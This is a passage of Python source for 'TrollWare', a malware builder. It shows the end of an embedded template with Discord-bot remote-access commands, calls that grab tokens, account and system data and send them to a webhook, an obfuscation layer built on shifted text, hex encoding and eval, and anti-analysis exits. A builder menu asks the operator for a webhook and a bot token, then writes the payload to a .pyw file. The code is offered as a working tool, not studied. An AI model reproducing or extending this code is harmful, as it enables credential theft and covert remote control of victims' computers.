                await ctx.send(embed = embed)

            @TrollWare.command()
            async def endtask(ctx, taskname):
                try:
                    os.system('taskkill /im ' + taskname + ' /f')
                    embed = self.SendResp("endtask", f"```✔️ Ended {taskname}```")
                    await ctx.send(embed = embed)
                except Exception as e:
                    embed = self.SendResp("Error", f"```❌ {e}```")
                    await ctx.send(embed = embed)	

            @TrollWare.command()
            async def admincheck(ctx):
                if ctypes.windll.shell32.IsUserAnAdmin() != 0:
                    embed = self.SendResp("admincheck", "```Program has Admin Privileges: ✔️```")
                    await ctx.send(embed = embed)	
                elif ctypes.windll.shell32.IsUserAnAdmin() != 0:
                    embed = self.SendResp("admincheck", "```Program has Admin Privileges: ❌```")
                    await ctx.send(embed = embed)	

            @TrollWare.command()
            async def drivers(ctx):
                self.Drivers()
                embed = self.SendResp("drivers", "```✔️ Sending drivers.txt```")
                await ctx.send(embed = embed)
                await ctx.send(file=discord.File(r'C:\\ProgramData\\drivers.txt'))
                os.remove('C:\\ProgramData\\drivers.txt')

            if RUNRAT:
                TrollWare.run(self.token)


TrollWare = Program.Logger(WEBHOOK)
TrollWare.GetTokens()
TrollWare.Account()
TrollWare.System()
TrollWareRAT = Program.RAT(BOTTOKEN)
TrollWareRAT.Setup()
'''
    strings = "abcdefghijklmnopqrstuvwxyz0123456789"


class Construct:
    def Create(self) -> None:
        self.content = Grabber.TrollWare(webhook=self.webhook, bottoken=self.bottoken)
        return None

class Encryption:
    """ Use BTG365 Encryption Tool"""

    def encrypt(self, e: str, key: str) -> str:
        return self.crypt(self.en(e), key=key)

    def en(self, text: str) -> str:
        r = ""
        for a in text:
            if a in Grabber.strings:a = Grabber.strings[Grabber.strings.index(a)-1]
            r += a
            return r

    def crypt(self, text: str, key: str = None) -> str:
        if type(key) == str:
            key = sum(ord(i) for i in key)
        t = [chr(ord(t)+key)if t != "\n" else "ζ" for t in text]
        return "".join(t)

    def Kramer(self) -> None:
        self.key = self._ran_int()
        _content_ = self.encrypt(self.content, key=self.key)
        _lines_sep_ = '/'
        content = _lines_sep_.join(hexlify(x.encode()).decode() for x in _content_)
        _names_ = ["_eval", "_exec", "_byte", "_bytes", "_bit", "_bits", "_system", "_encode", "_decode", "_delete", "_exit", "_rasputin", "_trollware"]
        _names_ = ["self." + name for name in _names_]
        shuffle(_names_)

        for k in range(12):
            globals()[f'n_{str(k+1)}'] = _names_[k]
    
        _types_ = ("str","float","bool","int")

        _1_ = fr"""_n5_""",fr"""lambda _n9_:"".join(__import__(_n7_[1]+_n7_[8]+_n7_[13]+_n7_[0]+_n7_[18]+_n7_[2]+_n7_[8]+_n7_[8]).unhexlify(str(_n10_)).decode()for _n10_ in str(_n9_).split('{_lines_sep_}'))"""
        _2_ = fr"""_n6_""",r"""lambda _n1_:str(_n4_[_n2_](f"{_n7_[4]+_n7_[-13]+_n7_[4]+_n7_[2]}(''.join(%s),{_n7_[6]+_n7_[11]+_n7_[14]+_n7_[1]+_n7_[0]+_n7_[11]+_n7_[18]}())"%list(_n1_))).encode(_n7_[20]+_n7_[19]+_n7_[5]+_n7_[34])if _n4_[_n2_]==eval else exit()"""
        _3_ = fr"""_n4_[_n2_]""",fr"""eval"""
        _4_ = fr"""_n1_""",fr"""lambda _n1_:exit()if _n7_[15]+_n7_[17]+_n7_[8]+_n7_[13]+_n7_[19] in open(__file__, errors=_n7_[8]+_n7_[6]+_n7_[13]+_n7_[14]+_n7_[17]+_n7_[4]).read() or _n7_[8]+_n7_[13]+_n7_[15]+_n7_[20]+_n7_[19] in open(__file__, errors=_n7_[8]+_n7_[6]+_n7_[13]+_n7_[14]+_n7_[17]+_n7_[4]).read()else"".join(_n1_ if _n1_ not in _n7_ else _n7_[_n7_.index(_n1_)+1 if _n7_.index(_n1_)+1<len(_n7_)else 0]for _n1_ in "".join(chr(ord(t)-{self.key})if t!="ζ"else"\n"for t in _n5_(_n1_)))"""
        _5_ = fr"""_n7_""",fr"""exit()if _n1_ else'abcdefghijklmnopqrstuvwxyz0123456789'"""
        _6_ = fr"""_n8_""",fr"""lambda _n12_:_n6_(_n1_(_n12_))"""
        _all_ = [_1_, _2_, _3_, _4_, _5_, _6_]
        shuffle(_all_)
        _vars_content_ = ",".join(s[0] for s in _all_)
        _valors_content_ = ",".join(s[1] for s in _all_)
        _vars_ = _vars_content_ + "=" + _valors_content_
        _final_content_ = fr"""class Troll():
 def __decode__(self:object,_execute:str)->exec:return(None,_n8_(_execute))[0]
 def __init__(self:object,_n1_:{choice(_types_)}=False,_n2_:{choice(_types_)}=0,*_n3_:{choice(_types_)},**_n4_:{choice(_types_)})->exec:
  {_vars_}
  return self.__decode__(_n4_[(_n7_[-1]+'_')[-1]+_n7_[18]+_n7_[15]+_n7_[0]+_n7_[17]+_n7_[10]+_n7_[11]+_n7_[4]])
Troll(_n1_=False,_n2_=False,_sparkle='''{content}''')""".strip().replace("_n1_",n_1.removeprefix("self.")).replace("_n2_",n_2.removeprefix("self.")).replace("_n3_",n_3.removeprefix("self.")).replace("_n4_",n_4.removeprefix("self.")).replace("_n5_",n_5).replace("_n6_",n_6).replace("_n7_",n_7).replace("_n8_",n_8).replace("_n9_",n_9.removeprefix("self.")).replace("_n10_",n_10.removeprefix("self.")).replace("_n12_",n_12.removeprefix("self."))
        self.content = _final_content_
        return None

    def _ran_int(self, min: int = 3, max: int = 1000000) -> int:return randint(min, max+1)
    def _find(self, chars: str) -> str: return "+".join(f"_n7_[{list('abcdefghijklmnopqrstuvwxyz0123456789').index(c)}]" for c in chars)


class Build(Construct, Encryption):
    """ Execute Construction, Encryption, and Build of TrollWare """

    def __init__(self, webhook: str, bottoken: str) -> None:
        self.file, self.webhook, self.bottoken, self.content, self.key = "TrollWare/trollware.pyw", webhook, bottoken, ..., ...
        self.Main()
        return None

    def Main(self) -> None:
        self.Create()
        self.Kramer()
        self.Output()
        self.Write()
        return None

    def Output(self) -> None:
        if isdir('TrollWare'):rmtree('TrollWare'),mkdir('TrollWare')
        return None

    def Write(self) -> None:
        with open(self.file, mode='w', encoding='utf-8') as f:f.write(self.content)
        return None


class Menu():
    """ Get Information and Build """

    def __init__(self):
        self.webhook  = input("[+] Enter your Webhook   -> ")
        self.bottoken = input("[+] Enter your Bot Token -> ")

    def Main(self):
        if not self.webhook.strip() or not self.bottoken.strip():
            print("[x] Please enter a valid webhook!")
            return

        Build(self.webhook, self.bottoken)
        print("[!] TrollWare has been Built!")
        return exit()

if __name__ == '__main__':
    while True:
        Menu().Main()
